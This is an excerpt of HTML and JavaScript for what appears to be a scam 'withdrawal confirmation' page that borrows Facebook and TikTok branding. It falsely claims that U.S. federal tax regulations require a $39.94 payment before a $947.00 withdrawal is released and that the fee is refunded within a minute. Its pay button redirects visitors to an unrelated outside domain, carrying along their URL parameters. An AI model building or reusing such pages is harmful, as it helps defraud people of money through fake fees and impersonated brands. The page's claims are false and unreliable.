    ...
    <div class="confirmation-container">
      <div class="confirmation-header">
        <div class="confirmation-logo">
          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/89/Facebook_Logo_%282019%29.svg/3840px-Facebook_Logo_%282019%29.svg.png" alt="TikTok">
        </div>
      </div>
      ...
      <div class="confirmation-section">
        ...
        <div class="confirmation-fee-description">
          According to U.S. federal tax regulations, a payment of <span class="bold">$39.94</span> is required before the release of your withdrawal totaling <span class="bold">$947.00</span> can be processed. This amount will be automatically refunded to you within 1 minute after processing.
        </div>
      </div>
          ...
          <div class="confirmation-requirement-item">
            ...
            <div class="confirmation-requirement-content">
              ...
              <div class="confirmation-requirement-description">
                $39.94 required payment under federal regulations
              </div>
            </div>
          </div>
          <div class="confirmation-requirement-item">
...
function setupRegistrationPage() {
  ...
  if (payButton) {
    payButton.addEventListener("click", (e) => {
      ...
      window.location.href = "https://controlvitallean.com/loading.html" + window.location.search;
    });
  }
}
